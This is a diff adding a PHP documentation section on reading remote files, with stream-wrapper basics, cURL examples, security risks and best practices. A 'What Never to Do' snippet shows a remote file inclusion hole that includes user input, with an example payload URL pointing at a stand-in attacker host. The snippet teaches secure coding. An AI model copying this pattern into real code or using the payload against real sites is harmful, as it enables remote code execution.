@@ -19109,7 +19109,198 @@ session_start();
 </p>
 
 <h4 id="using-remote-files">USING REMOTE FILES</h4>
-.
+<p>
+  <strong>Using Remote Files</strong> refers to PHP's ability to read, include,
+  or interact with files and resources located on external servers via URLs.
+  This is made possible by PHP's stream wrappers, which abstract different
+  data sources — including HTTP, HTTPS, and FTP — behind a unified file-like
+  interface.
+</p>
+<p>
+  While powerful, this feature introduces significant security risks and must
+  be handled with strict controls. PHP exposes two critical configuration
+  directives that govern remote file behavior: <code>allow_url_fopen</code>
+  and <code>allow_url_include</code>.
+</p>
+
+<h5>How It Works</h5>
+<ol>
+  <li>PHP receives a file path or URL as an argument to a file function</li>
+  <li>The stream wrapper layer identifies the protocol (http, ftp, etc.)</li>
+  <li>PHP opens a connection to the remote resource</li>
+  <li>Data is retrieved and made available as a local stream</li>
+  <li>The application processes the remote content</li>
+</ol>
+
+<h5>PHP Configuration Directives</h5>
+<ul>
+  <li>
+    <strong>allow_url_fopen</strong> – Enables URL-aware file functions such as
+    <code>file_get_contents()</code>, <code>fopen()</code>, and <code>file()</code>
+    to access remote resources. Enabled by default.
+  </li>
+  <li>
+    <strong>allow_url_include</strong> – Enables <code>include</code>,
+    <code>require</code>, <code>include_once</code>, and <code>require_once</code>
+    to load remote files. Disabled by default and should never be enabled.
+  </li>
+</ul>
+
+<h5>Reading a Remote File</h5>
+<pre><code class="language-php">
+<?php
+// Requires allow_url_fopen = On
+$url     = 'https://api.example.com/data.json';
+$content = file_get_contents($url);
+
+if ($content === false) {
+    echo 'Failed to retrieve remote file.';
+    exit;
+}
+
+$data = json_decode($content, true);
+var_dump($data);
+?>
+</code></pre>
+
+<h5>Reading a Remote File with Context Options</h5>
+<pre><code class="language-php">
+<?php
+$url = 'https://api.example.com/data.json';
+
+$context = stream_context_create([
+    'http' => [
+        'method'          => 'GET',
+        'header'          => "Accept: application/json\r\n",
+        'timeout'         => 5,
+        'follow_location' => 1,
+    ],
+    'ssl' => [
+        'verify_peer'      => true,
+        'verify_peer_name' => true,
+    ]
+]);
+
+$content = file_get_contents($url, false, $context);
+
+if ($content === false) {
+    echo 'Request failed.';
+    exit;
+}
+
+$data = json_decode($content, true);
+var_dump($data);
+?>
+</code></pre>
+
+<h5>Using fopen() with a Remote Resource</h5>
+<pre><code class="language-php">
+<?php
+$handle = fopen('https://example.com/largefile.csv', 'r');
+
+if ($handle) {
+    while (($line = fgets($handle)) !== false) {
+        echo htmlspecialchars($line) . '<br>';
+    }
+    fclose($handle);
+} else {
+    echo 'Unable to open remote file.';
+}
+?>
+</code></pre>
+
+<h5>Recommended Alternative — cURL</h5>
+<pre><code class="language-php">
+<?php
+// cURL offers greater control, security options, and error handling
+$ch = curl_init('https://api.example.com/data.json');
+
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT        => 10,
+    CURLOPT_SSL_VERIFYPEER => true,
+    CURLOPT_SSL_VERIFYHOST => 2,
+    CURLOPT_HTTPHEADER     => ['Accept: application/json'],
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_MAXREDIRS      => 3,
+]);
+
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$error    = curl_error($ch);
+
+curl_close($ch);
+
+if ($response === false || $httpCode !== 200) {
+    echo 'Request failed: ' . htmlspecialchars($error);
+    exit;
+}
+
+$data = json_decode($response, true);
+var_dump($data);
+?>
+</code></pre>
+
+<h5>Remote File Inclusion — What Never to Do</h5>
+<pre><code class="language-php">
+<?php
+// CRITICAL VULNERABILITY — Remote File Inclusion (RFI)
+// Never include files from user-supplied input or remote URLs
+
+$page = $_GET['page'];
+include($page); // Attacker can pass: http://evil.com/malware.php
+
+// This allows arbitrary remote code execution
+?>
+</code></pre>
+
+<h5>Stream Wrappers Available in PHP</h5>
+<ul>
+  <li><strong>http:// / https://</strong> – Read-only access to remote HTTP resources</li>
+  <li><strong>ftp:// / ftps://</strong> – Read and write access to FTP servers</li>
+  <li><strong>file://</strong> – Access to local filesystem resources</li>
+  <li><strong>php://</strong> – Access to PHP I/O streams (<code>php://input</code>, <code>php://output</code>)</li>
+  <li><strong>data://</strong> – Inline data encoded as a URL</li>
+  <li><strong>zip:// / phar://</strong> – Access to compressed archive contents</li>
+</ul>
+
+<h5>Security Risks</h5>
+<ul>
+  <li><strong>Remote File Inclusion (RFI)</strong> – Attacker includes and executes a remote malicious script</li>
+  <li><strong>Server-Side Request Forgery (SSRF)</strong> – Application is tricked into making requests to internal services</li>
+  <li><strong>Data Injection</strong> – Untrusted remote content is processed or rendered without sanitization</li>
+  <li><strong>SSL Stripping</strong> – Disabling certificate verification exposes data to man-in-the-middle attacks</li>
+  <li><strong>Denial of Service</strong> – Uncontrolled external requests can exhaust server resources or timeouts</li>
+</ul>
+
+<h5>Best Practices</h5>
+<ul>
+  <li>Never enable <code>allow_url_include</code> under any circumstances</li>
+  <li>Never use user-supplied input as a file path or URL in include/require statements</li>
+  <li>Always validate and whitelist URLs before making remote requests</li>
+  <li>Always verify SSL certificates when making HTTPS requests</li>
+  <li>Prefer cURL over <code>file_get_contents()</code> for greater control and security</li>
+  <li>Set timeouts on all remote requests to prevent resource exhaustion</li>
+  <li>Sanitize and validate all content retrieved from remote sources before using it</li>
+  <li>Restrict outbound connections at the network level when possible</li>
+</ul>
+
+<h5>Common Use Cases</h5>
+<ul>
+  <li>Consuming external REST APIs</li>
+  <li>Fetching remote configuration or data feeds</li>
+  <li>Downloading files from trusted remote sources</li>
+  <li>Integrating with third-party services (payment gateways, webhooks)</li>
+  <li>Reading public data sources such as RSS feeds or JSON endpoints</li>
+</ul>
+
+<p>
+  PHP's ability to interact with remote files is a double-edged sword. When
+  used responsibly — with proper validation, SSL enforcement, timeouts, and
+  cURL as the preferred transport layer — it enables powerful integrations.
+  However, misuse or misconfiguration can open critical attack vectors that
+  compromise the entire application.
+</p>
 
 <h4 id="connection-handling">CONNECTION HANDLING</h4>
 .
